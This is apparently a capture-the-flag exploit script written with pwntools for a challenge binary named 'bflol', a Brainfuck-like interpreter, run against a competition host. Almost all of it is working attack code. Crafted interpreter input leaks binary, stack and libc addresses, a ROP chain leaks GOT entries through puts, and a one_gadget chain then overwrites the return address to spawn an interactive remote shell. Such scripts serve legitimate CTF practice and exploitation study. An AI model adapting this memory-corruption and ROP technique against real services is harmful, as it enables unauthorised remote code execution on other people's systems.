#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys

from pwn import *


context.log_level = 'info'
context.timeout = 15

BINARY = './bflol'
LIB = './libc6_2.28-10_amd64.so'
HOST = 'chal.cybersecurityrumble.de'
PORT = 19783

GDB_COMMANDS = ['b interpret']


def get_ropchain_leak():
    """Returns a ropchain for leaking some libc addresses.

    Leaked fingerprints:
        getchar: e80
        putchar: 260
        fgets: f40
    """

    pop_rdi_ret = context.binary.address + 0x1513

    ropchain = [
        pop_rdi_ret,
        context.binary.got['getchar'],
        context.binary.plt['puts'],
        pop_rdi_ret,
        context.binary.got['putchar'],
        context.binary.plt['puts'],
    ]
    return b''.join(map(p64, ropchain))


def get_ropchain_rce(libc):
    """Returns a ropchain for remote code execution."""
    one_gadget = libc.address + 0x4484f
    ropchain = [
        one_gadget,
    ]

    return b''.join(map(p64, ropchain))


def exploit(p, libc, fingerprint=False):
    """Exploit goes here."""

    libc.address = 0

    if fingerprint:
        get_ropchain = get_ropchain_leak
    else:
        get_ropchain = lambda : get_ropchain_rce(libc)

    code = ''
    code += '<'*12
    code += '<.'*8  # read binary address
    code += '<'*8
    code += '<.'*8  # read stack address
    code += '<'*48
    code += '<.'*8  # read libc address

    # Now we need to go to the rsp on the stack
    code += '>'*92 + '+'
    code += '\xff'
    code += '[->+]' + '-'  # Go to the '\xff' from the previous line
    code += '>' + '[>]'  # Go to the end of our input
    code += '>'*24  # Go to the rsp

    for _ in range(len(get_ropchain())//8):
        code += ',>'*6
        code += '>'*2

    # This might help for debugging
    code += '.>'*16
    code += ','*1
    code += '>'*(1000-len(code)-5)

    p.sendline(code)
    binary_leak = u64(p.recvn(8)[::-1])
    stack_leak = u64(p.recvn(8)[::-1])
    libc_leak = u64(p.recvn(8)[::-1])

    context.binary.address = binary_leak - 0x148c  # This is some constant return address
    libc.address = libc_leak - 0x1bc760  # Some constant offset to a file struct in libc

    log.info(f'binary @ address 0x{context.binary.address:016x}')
    log.info(f'libc @ address 0x{libc.address:016x}')
    log.info(f'stack leak: 0x{stack_leak:016x}')

    final_ropchain = get_ropchain()

    for index in range(len(final_ropchain)//8):
        p.send(final_ropchain[index*8:index*8+6])
    p.sendline()
    p.recvn(16)

    if fingerprint:
        leak_getchar = u64(p.recvuntil('\n', drop=True).ljust(8, b'\0'))
        leak_putchar = u64(p.recvuntil('\n', drop=True).ljust(8, b'\0'))

        log.info(f'getchar @ address 0x{leak_getchar:016x}')
        log.info(f'putchar @ address 0x{leak_putchar:016x}')
    else:
        log.info(f'Launching shell')

        p.interactive()


def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <mode>')
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f'Failed to load binary ({BINARY})')

    libc = None
    try:
        libc = ELF(LIB)
        env = os.environ.copy()
        env['LD_PRELOAD'] = LIB
    except IOError:
        print(f'Failed to load library ({LIB})')

    mode = sys.argv[1]

    if mode == 'local':
        p = remote('pwn.local', 2222)
    elif mode == 'debug':
        p = remote('pwn.local', 2223)
        gdb_cmd = [
            'tmux',
            'split-window',
            '-p',
            '65',
            'gdb',
            '-ex',
            'target remote pwn.local:2224',
        ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append('-ex')
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == 'remote':
        p = remote(HOST, PORT)
    else:
        print('Invalid mode')
        sys.exit(1)

    if len(sys.argv)>2 and sys.argv[2]=='fingerprint':
        exploit(p, libc, fingerprint=True)
    else:
        exploit(p, libc)

if __name__ == '__main__':

    main()
